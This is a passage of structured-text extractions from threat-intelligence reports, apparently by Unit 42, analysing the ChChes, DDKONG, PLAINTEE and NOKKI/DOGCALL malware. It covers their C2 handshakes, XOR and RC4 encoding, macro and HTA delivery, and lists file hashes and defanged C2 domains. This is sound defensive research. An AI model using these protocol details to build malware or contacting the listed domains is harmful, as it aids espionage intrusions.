                "The URI used above is randomly generated for each HTTP request made by ChChes.",
                "The data embedded within the Cookie header is encrypted using a unique technique.",
                "For each key/value pair, separated by a ;, the malware will first perform a MD5 hash of the key, and extract the middle 16 bytes.",
                "The value is base64-decoded after the string is unquoted.",
                "Finally, the base64-decoded data is decrypted using RC4 with the previously obtained 16 bytes.",
                "All of the data is concatenated to form the final, decrypted data."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following Python code shows an example of decoding the supplied Cookie field:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The script above produces the following output:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The initial A character witnessed in the output above instructs the remote server that this is an initial beacon, or the first expected request sent by ChChes."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The C2 will respond with a Set-Cookie header that contains the middle 16 bytes of the MD5 hash performed against the hostname and PID.",
                "Using the above example, the C2 would perform the MD5 against WBQTLJRH9553618*2564."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The resulting middle 16 characters is b331106210b6364c."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The subsequent request made by ChChes looks like the following:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 9.",
                "Second network request made by ChChes"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Decrypted, we see the following contents stored within the Cookie field:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Bb331106210b6364c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The first character of B signifies that this is the second request, and the remaining data is the 16 bytes previously seen in the C2 response within the Set-Cookie header."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "At this stage, the C2 server is expected to return content in the following format:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "[",
                "Middle MD5][Base64-Encoded Data][Middle MD5]"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Middle MD5 field contains the middle 16 bytes of the MD5 hash of the b331106210b6364c string.",
                "This would result in a string of 500089dadf52ae0b in this particular example.",
                "The Base64-Encoded Data field contains a fairly complex structure that will store a module that is to be loaded and subsequently run by ChChes."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A visualization of this network communication can be seen in the following figure:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 10.",
                "Network flow of ChChes"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ChChes",
                "acts as an initial infiltration point on a victim machine.",
                "It has the ability to load additional code that in turn may accomplish any number of tasks.",
                "During analysis, no C2 servers were found to be active, and Unit 42 was unable to identify any modules being loaded by ChChes.",
                "However, the JPCERT also recently analyzed this family and was able to collect modules that give ChChes the following functions:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "However, the lack of persistence built into ChChes suggests that it by itself is not intended to run on a victims machine for long periods of time.",
                "In a successful intrusion, it may be only a first stage tool used by the attackers to orient where they landed in a network, and other malware will be deployed as a second stage layering for persistence and additional access as the attackers move laterally through a network."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "These attacks show Japan continues to be a target of interest to APT campaigns.",
                "menuPass has targeted individuals and organizations in Japan since at least 2014, and as the same organizations and academics were largely targeted each month in these attacks, it further shows menuPass is persistent in attempts to compromise their targets.",
                "menuPass also heavily favors spear phishing, and so takes steps to socially engineer their spear phishes for maximum appearance of legitimacy.",
                "This, and their persistence, highlights the need for training and awareness of spear phishing on the part of both individuals and organizations likely to be targeted.",
                "menuPass is an ongoing APT campaign with a broad range of targets and will likely continue to target Japan in the future."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected from these malware families and C2 infrastructure by:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, Autofocus subscribers can learn more about menuPass by exploring tied activity with the menuPass tag."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ChChes"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5961861d2b9f50d05055814e6bfd1c6291b30719f8a4d02d4cf80c2e87753fa1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e90064884190b14a6621c18d1f9719a37b9e5f98506e28ff0636438e3282098b"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ae6b45a92384f6e43672e617c53a44225e2944d66c1ffb074694526386074145"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fd6a956a7708708cddff78c8505c7db73d7c4e961da8a3c00cc5a51171a92b7b"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2c71eb5c781daa43047fa6e3d85d51a061aa1dfa41feb338e0d4139a6dfd6910"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "316e89d866d5c710530c2103f183d86c31e9a90d55e2ebc2dda94f112f3bdb6d"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "efa0b414a831cbf724d1c67808b7483dec22a981ae670947793d114048f88057"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6605b27e95f5c3c8012e4a75d1861786fb749b9a712a5f4871adbad81addb59e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fadf362a52dcf884f0d41ce3df9eaa9bb30227afda50c0e0657c096baff501f0"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2965c1b6ab9d1601752cb4aa26d64a444b0a535b1a190a70d5ce935be3f91699"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e88f5bf4be37e0dc90ba1a06a2d47faaeea9047fec07c17c2a76f9f7ab98acf0"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d26dae0d8e5c23ec35e8b9cf126cded45b8096fc07560ad1c06585357921eeed"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e6ecb146f469d243945ad8a5451ba1129c5b190f7d50c64580dbad4b8246f88e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4521a74337a8b454f9b80c7d9e57b4c9580567f84e513d9a3ce763275c55e691"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "bc2f07066c624663b0a6f71cb965009d4d9b480213de51809cdc454ca55f1a91"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c21eaadf9ffc62ca4673e27e06c16447f103c0cf7acd8db6ac5c8bd17805e39d"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f251485a62e104dfd8629dc4d2dfd572ebd0ab554602d682a28682876a47e773"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b20ce00a6864225f05de6407fac80ddb83cd0aec00ada438c1e354cdd0d7d5df"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c6b8ed157eed54958da73716f8db253ba5124a0e4b649f08de060c4aa6531afc"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9a6692690c03ec33c758cb5648be1ed886ff039e6b72f1c43b23fbd9c342ce8c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cb0c8681a407a76f8c0fd2512197aafad8120aa62e5c871c29d1fd2a102bc628"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4cc0adf4baa1e3932d74282affb1a137b30820934ad4f80daceec712ba2bbe14"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "312dc69dd6ea16842d6e58cd7fd98ba4d28eefeb4fd4c4d198fac4eee76f93c3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "45d804f35266b26bf63e3d616715fc593931e33aa07feba5ad6875609692efa2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "19aa5019f3c00211182b2a80dd9675721dac7cfb31d174436d3b8ec9f97d898b"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "PlugX"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f1ca9998ca9078c27a6dab286dfe25fcdfb1ad734cc2af390bdcb97da1214563"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6392e0701a77ea25354b1f40f5b867a35c0142abde785a66b83c9c8d2c14c0c3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6c7e85e426999579dd6a540fcd827b644a79cda0ad50211d585a0be513571586"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9f01dd2b19a1032e848619428dd46bfeb6772be2e78b33723d2fa076f1320c57"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6c7e85e426999579dd6a540fcd827b644a79cda0ad50211d585a0be513571586"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "76721d08b83aae945aa00fe69319f896b92c456def4df5b203357cf443074c03"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "dcff19fc193f1ba63c5dc6f91f00070e6912dcec3868e889fed37102698b554b"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7eeaa97d346bc3f8090e5b742f42e8900127703420295279ac7e04d06ebe0a04"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a6b6c66735e5e26002202b9d263bf8c97e278f6969c141853857000c8d242d24"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5412cddde0a2f2d78ec9de0f9a02ac2b22882543c9f15724ebe14b3a0bf8cbda"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "92dbbe0eff3fe0082c3485b99e6a949d9c3747afa493a0a1e336829a7c1faafb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "PIVY"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f0002b912135bcee83f901715002514fdc89b5b8ed7585e07e482331e4a56c06"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "412120355d9ac8c37b5623eea86d82925ca837c4f8be4aa24475415838ecb356"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "44a7bea8a08f4c2feb74c6a00ff1114ba251f3dc6922ea5ffab9e749c98cbdce"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9edf191c6ca1e4eddc40c33e2a2edf104ce8dfff37b2a8b57b8224312ff008fe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C2s"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "dick[.]ccfchrist[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "trout[.]belowto[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "sakai[.]unhamj[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "zebra[.]wthelpdesk[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "area[.]wthelpdesk[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "kawasaki[.]cloud-maste[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "kawasaki[.]unhamj[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fukuoka[.]cloud-maste[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "scorpion[.]poulsenv[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "lion[.]wchildress[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fbi[.]sexxxy[.]biz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cia[.]toh[.]info"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2014[.]zzux[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "nttdata[.]otzo[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "iphone[.]vizvaz[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "app[.]lehigtapp[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "jimin[.]jimindaddy[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Jepsen[.]r3u8[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "inspgon[.]re26[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "nunluck[.]re26[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "yahoo[.]incloud-go[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "msn[.]incloud-go[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "www[.]mseupdate[.]ourhobby[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "contractus[.]qpoe[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "apple[.]cmdnetview[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cvnx[.]zyns[.]com"
            ]
        }
    ],
    "ba9673e18bef695e9ec11bf461910815e9de2b1e": [
        {
            "type": "paragraph",
            "content": [
                "Throughout 2017 and 2018 Unit 42 has been tracking and observing a series of highly targeted attacks focused in South East Asia, building on our research into the KHRAT Trojan.",
                "Based on the evidence, these attacks appear to be conducted by the same set of attackers using previously unknown malware families.",
                "In addition, these attacks appear to be highly targeted in their distribution of the malware used, as well as the targets chosen.",
                "Based on these factors, Unit 42 believes the attackers behind these attacks are conducting their campaigns for espionage purposes.",
                "We believe this group is previously unidentified and therefore have we have dubbed it RANCOR.",
                "The Rancor groups attacks use two primary malware families which we describe in depth later in this blog and are naming DDKONG and PLAINTEE.",
                "DDKONG is used throughout the campaign and PLAINTEE appears to be new addition to these attackers toolkit.",
                "Countries Unit 42 has identified as targeted by Rancor with these malware families include, but are not limited to:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We identified decoy files which indicate these attacks began with spear phishing messages but have not observed the actual messages.",
                "These decoys contain details from public news articles focused primarily on political news and events.",
                "Based on this, we believe the Rancor attackers were targeting political entities.",
                "Additionally, these decoy documents are hosted on legitimate websites including a government website belonging to the Cambodia Government and in at least once case, Facebook.",
                "The malware and infrastructure used in these attacks falls into two distinct clusters, which we are labeling A and B, that are linked through their use of the PLAINTEE malware and several softer linkages.",
                "Linking the attacks\nBuilding on our previous research into KHRAT Trojan, we have been monitoring KHRAT command and control domains.",
                "In February 2018, several KHRAT associated domains began resolving to the IP address 89.46.222[.]97.",
                "We made this IP the center of our investigation.",
                "Examining passive DNS (pDNS) records from PassiveTotal revealed several domain names associated with this IP that mimic popular technology companies.",
                "One of these domains, facebook-apps[.]com, was identified in one of the malware samples associated with this IP address.",
                "The following table depicts the two malware samples that are directly related to this IP address:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Digging in further, the malware family we later named PLAINTEE appears to be quite unique with only six samples present in our data set.",
                "Apart from one sample (c35609822e6239934606a99cb3dbc925f4768f0b0654d6a2adc35eca473c505d), we were able to link all PLAINTEE samples together by the infrastructure they use.",
                "The diagram in Figure 1 shows the samples, domains, IP addresses and e-mail addresses that we identified during our investigation (See Appendix Bfor more detail on these.)",
                "There is a clear split between Cluster A and Cluster B, with no infrastructure overlap between the two."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 - Diagram showing the split of PLAINTEE samples across the two clusters of activity."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Our Investigation into both clusters further showed that they were both involved in attacks targeting organizations in South East Asia.",
                "Based on the use of the relatively unique PLAINTEE malware, the malwares use of the same file paths on in each cluster, and the similar targeting, we have grouped these attacks together under the RANCOR campaign moniker.",
                "Delivery & Loader mechanisms\nFor many of the samples weve been unable to identify how they were delivered to end victims; however, in three cases we were able to locate the files used to deliver the Trojan, which we found merited more investigation and are briefly discussed below.\n\nCluster A\nCase 1: Delivery via document property macro  a789a282e0d65a050cccae66c56632245af1c8a589ace2ca5ca79572289fd483\nIn our research we found at least one attack against a company leveraging a Microsoft Office Excel document with an embedded macro to launch the malware.",
                "Interestingly, the delivery document borrowed a technique which was publicized in late 2017 as being used by the Sofacy threat actors, embedding the main malicious code in a EXIF metadata property of the document.",
                "By doing so, the main content of the macro itself (Figure 2) can be kept relatively simple, and the malicious codes small footprint can help enable evasion of automated detection mechanisms based on macro content."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 \u2013 The entire contents of the macro"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The 'Company' field in this case, contains the raw command that the attacker wishes to run, downloading and executing the next stage of the malware:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Cluster B\nCase 2: Delivery via HTA Loader - 1dc5966572e94afc2fbcf8e93e3382eef4e4d7b5bc02f24069c403a28fa6a458\nIn this case the attackers sent an HTML Application file (.hta) to targets most likely as an email attachment.",
                "When opened and then executed, the key components of the HTA file downloads and executes further malware from a remote URLand loads a decoy image hosted externally (Figure 3)."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 \u2013 The decoy image loaded when the .HTA file is executed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The decoy in Figure 3 strongly suggests the attackers were conducting an attack against a political entity in Cambodia.",
                "The Cambodia National Rescue Party is a politically motivated opposition movement.",
                "Case 3: Delivery via DLL Loader -\n0bb20a9570a9b1e3a72203951268ffe83af6dcae7342a790fe195a2ef109d855\nWe identified three unique DLL loaders during this analysis.",
                "The loaders are extremely simple with a single exported function and are responsible for executing a single command.",
                "An exemplar command is given below:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the above command, the malware is downloading and executing a payload and configuring it for persistent execution.",
                "In two of the three examples, the malware also downloads and opens a decoy PDF document hosted on a legitimate but compromised website.",
                "The decoy documents seen in these cases were related to Cambodian news articles, an example is shown in Figure 4 below."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 - 1.pdf decoy delivered by downloader"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The decoy above discusses a recent event that took place against political party supporters in Cambodia, a similar theme to the decoy document observed in Figure 3.",
                "It is worth noting that the third DLL mentioned attempts to download the decoy document from a government website.",
                "This same website was used previously in a KHRat campaign targeting Cambodian citizens.",
                "Additionally, two of the three DLL loaders were found to be hosted on this same compromised website, implying that it was likely compromised again in early 2018.",
                "The filenames for these two DLL loaders are as follows:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Malware Overview\nIn all cases where we were able to identify the final payloads used, the DDKONG or PLAINTEE malware families were used.",
                "We observed DDKONG in use between February 2017 and the present, while PLAINTEE is a newer addition with the earliest known sample being observed in October 2017.",
                "Its unclear if DDKONG is only used by one threat actor or more than one based on the data available.",
                "In this section well go over the capabilities and operation of these malware families.\n\nDDKONG\nFor the analysis below, we used the following file:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1 \u2013 DDKONG sample analyzed in full."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware in question is configured with the following three exported functions:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The ServiceMain exported function indicates that this DLL is expected to be loaded as a service.",
                "If this function is successfully loaded, it will ultimately spawn a new instance of itself with the Rundll32Call export via a call to rundll32.exe.",
                "The Rundll32Call exported function begins by creating a named event named RunOnce.",
                "This event ensures that only a single instance of DDKong is executed at a given time.",
                "If this is the only instance of DDKong running at the time, the malware continues.",
                "If its not, it dies.",
                "This ensures that only a single instance of DDKong is executed at a given time.",
                "DDKong attempts to decode an embedded configuration using a single byte XOR key of 0xC3.",
                "Once decoded, the configuration contains the data shown in Figure 5 below."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5 - Decoded configuration with fields highlighted"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After this configuration is decoded and parsed, DDKONG proceeds to send a beacon to the configured remote server via a raw TCP connection.",
                "The packet has a header of length 32 and an optional payload.",
                "In the beacon, no payload is provided, and as such, the length of this packet is set to zero."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6 \u2013 DDKONG beacon to remote C2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After it sends the beacon, the malware expects a response command of either 0x4 or 0x6.",
                "Both responses instruct the malware to download and load a remote plugin.",
                "In the event 0x4 is specified, the malware is instructed to load the exported InitAction function.",
                "If 0x6 is specified, the malware is instructed to load the exported KernelDllCmdAction function.",
                "Prior to downloading the plugin, the malware downloads a buffer that is concatenated with the embedded configuration and ultimately provided to the plugin at runtime.",
                "An example of this buffer at runtime is below:\n\n00000000: 43 3A 5C 55 73 65 72 73 5C 4D 53 5C 44 65 73 6B C:\\Users\\MS\\Desk\n00000010: 74 6F 70 5C 52 53 2D 41 54 54 20 56 33 5C 50 6C top\\RS-ATT V3\\Pl\n00000020: 75 67 69 6E 42 69",
                "6E 00 00 00 00 00 00 00 00 00 uginBin.........uginBin.........\n[TRUNCATED]\n00000100: 00 00 00 00 43 3A 5C 55 73 65 72 73 5C 4D 53 5C ....C:\\Users\\MS\\\n00000110: 44 65 73 6B 74 6F 70 5C 52 53 2D 41 54 54 20 56 Desktop\\RS-ATT V\n00000120:",
                "33 5C 5A 43",
                "6F",
                "6E 66 69 67 00 00 00 00 00 00 00 3\\ZConfig.......ZConfig.......\n[TRUNCATED]\n00000200: 00 00 00 00 00 00 00 00 00 40 00 00 F0 97 B5 01 .........@......\n\nAs we can see in the above text, two full file paths are included in this buffer, providing us with insight into the original malware familys name, as well as the author.",
                "After this buffer is collected, the malware downloads the plugin and loads the appropriate function.",
                "During runtime, the following plugin was identified:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 2 \u2013 Plugin downloaded during runtime for DDKong sample."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This plugin provides the attacker with the ability to both list files and download/upload files on the victim machine.\n\nPLAINTEE\nIn total we have been able to find six samples of PLAINTEE, which, based on our analysis, seems to be exclusively used by the RANCOR attackers.",
                "PLAINTEE is unusual in that it uses a custom UDP protocol for its network communications.",
                "For this walk through, we use the following sample:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 3 \u2013 PLAINTEE sample analyzed in full."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This sample is configured with three exported functions:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The DLL expects the export named 'Add' to be used when initially loaded.",
                "When this function is executed PLAINTEE executes the following command in a new process to add persistence:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Next, the malware calls the Sub function which begins by spawning a mutex named microsoftfuckedupb to ensure only a single instance is running at a given time.",
                "In addition, PLAINTEE will create a unique GUID via a call to CoCreateGuid() to be used as an identifier for the victim.",
                "The malware then proceeds to collect general system enumeration data about the infected machine and enters a loop where it will decode an embedded config blob and send an initial beacon to the C2 server.",
                "The configuration blob is encoded using a simple single-byte XOR scheme.",
                "The first byte of the string is used as the XOR key to in turn decode the remainder of the data.",
                "Decoding this blob yields the following information, also found within the original binary:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 4 \u2013 Configuration stored in the malware."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware then proceeds to beacon to the configured port via a custom UDP protocol.",
                "The network traffic is encoded in a similar fashion, with a random byte being selected as the first byte, which is then used to decode the remainder of the packet via XOR.",
                "An example of the decoded beacon is show in Figure 7."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7 PLAINTEE example beacon"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The structure for this beacon is given in Table 5."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 5 \u2013 Beacon structure for PLAINTEE."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This beacon is continuously sent out until a valid response is obtained from the C2 server (there is no sleep timer set).",
                "After the initial beacon, there is a two second delay in between all other requests made.",
                "This response is expected to have a return command of 0x66660002 and to contain the same GUID that was sent to the C2 server.",
                "Once this response is received, the malware spawns several new threads, with different Command parameters, with the overall objective of loading and executing a new plugin that is to be received from the C2 server."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "During a file analysis of PLAINTEE in WildFire, we observed the attackers download and execute a plugin during the runtime for that sample.",
                "The retrieved plugin was as follows:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 6 \u2013 PLAINTEE plugin observed in Wildfire"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "PLAINTEE expects the downloaded plugin to be a DLL with an export function of either 'shell' or 'file'.",
                "The plugin uses the same network protocol as PLAINTEE and so we were able to trivially decode further commands that were sent.",
                "The following commands were observed:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The attacker performed these two commands 33 seconds apart.",
                "As automated commands are typically performed more quickly this indicates that they may have been sent manually by the attacker.\n\nConclusions\nThe RANCOR campaign represents a continued trend of targeted attacks against entities within the South East Asia region.",
                "In a number of instances, politically motivated lures were used to entice victims into opening and subsequently loading previously undocumented malware families.",
                "These families made use of custom network communication to load and execute various plugins hosted by the attackers.",
                "Notably the PLAINTEE malwares use of a custom UDP protocol is rare and worth considering when building heuristics detections for unknown malware.",
                "Palo Alto Networks will continue to monitor these actors, their malware, and their infrastructure going forward.",
                "Palo Alto Networks customers are protected against the threats discussed in this blog in the following ways:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additional mitigations that could help to prevent attacks like these from succeeding in your environment include:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Appendix A  PLAINTEE older variant\nOlder variants of PLAINTEE can be identified via the unique mutex created during runtime.",
                "At least three variants of PLAINTEE have been identified to date, however, the following two samples have additional unique differences:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following actions are performed with the additional functions:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Appendix B"
            ]
        }
    ],
    "9f18d4eeeee14b7047764d32d681dac9179933b2": [
        {
            "type": "paragraph",
            "content": [
                "Recently, Unit 42 identified the NOKKI malware family that was used in attacks containing politically-motivated lures targeting Russian and Cambodian speaking individuals or organizations.",
                "As part of this research, an interesting tie was discovered to the threat actor group known as Reaper."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Reaper group has been publicly attributed to North Korea by other security organizations, targeting organizations that align with the interests of this country.",
                "Such targeted organizations include the military and defense industry within South Korea, as well as a Middle Eastern organization that was doing business with North Korea.",
                "Part of this groups modus operandi includes the use of a custom malware family called DOGCALL.",
                "DOGCALL is a remote access Trojan (RAT) that uses third-party hosting services to upload data and accept commands.",
                "At the time of publication, we observe this particular malware family in use by the Reaper threat actor group only."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This blog details the relationship found between the NOKKI and DOGCALL malware families, as well provides additional information about a previously unreported malware family used to deploy DOGCALL, which we have named Final1stspy based on a pdb string in the malware."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Tying the Knot"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While researching the NOKKI malware threat, Unit 42 discovered the most recent cluster of attacks beginning in July 2018 leveraged malicious macros within a Microsoft Word document.",
                "These particular macros were not overly complex in nature, and simply would attempt to perform the following actions:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To avoid detection, the macros employ simple obfuscation of interesting strings that ultimately just used base64 encoding.",
                "However, it used a somewhat unusual method where it would first convert the base64-encoded text into hex, and then convert that hex into a text string."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Malicious macro downloading remote payload and executing it (comments added by Unit 42 for clarity)"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 Malicious macro implementing unique deobfuscation scheme (comments added by malware author"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "By searching on this unique deobfuscation technique present in all samples delivering NOKKI, a single other file was identified.",
                "This file had the following properties:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Based on the original filename, we can surmise this malware sample targeted individuals interested in the World Cup hosted in Russia in 2018.",
                "As we can see in the figure below, the unique deobfuscation routine used between the samples is identical, including the comments included by the author."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 Similarities between NOKKI dropper and World Cup predictions dropper"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While the deobfuscation routine was identical, the actual functionality of the macro differed slightly.",
                "The NOKKI dropper samples downloaded both a payload and a decoy document, but this World Cup predictions malware sample downloads and executes a remote VBScript file wrapped in HTML and appends text to the original Word document to provide the lure for the victim."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The lure in question includes the below text from a publicly available article written on ESPN in the UK:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Peru and Denmark face off in the third match, and this time it doesn't seem as one sided.",
                "Four people go for a Peru victory, three for Denmark and three for the draw."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Last but not least, we get to see Croatia and Nigeria for the first time.",
                "Our Nigeria expert, Colin, reckons there will be plenty of goals and a 3-2 win for his side -- the only person to back the Super Eagles."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Check out how our pundits got on with their predictions for following games and remember to join the pundits' league in Match Predictor."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We've got our top talent on hand from England, the United States, Mexico, Brazil, Argentina, Colombia, Australia, and Africa -- many of whom will be based out in Russia for the tournament -- to analyze each and every one of the 64 matches."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We'll score our experts just as we do in the Match Predictor -- 10 points for correct result, with a bonus 20 points for getting the score line right too."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Interestingly enough, two commented out lures were also included in this document.",
                "One simply contains the phrase of I miss u., but the second lure contains text from a publicly available article online discussing a visit by the North Korean leader to Singapore, shown below."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This aircraft seems to have conveyed a North Korean advance team including diplomats and security personnel."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The 747-400, which just landed in Singapore, was apparently used to fly Kim and his personal aides to the summit."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This would also be consistent with our previous reporting that North Korea had settled on such a plan."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Jumbo Jet in question is quite special.",
                "B-2447 is used by the top rungs of the Chinese government, predominantly President Xi Jinping and his entourage, when traveling abroad."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It is capable of being specially outfitted with a VIP interior and has special interfaces for secure satellite communications among other modifications."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "With this in mind, it wasn't surprising seeing it being used as 'Kim Force One' for this special mission."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When the chain of execution completes on the World Cup predictions.doc file, a DOGCALL malware sample is executed on the victim machine."
            ]
        },
        {
            "type": "paragraph",
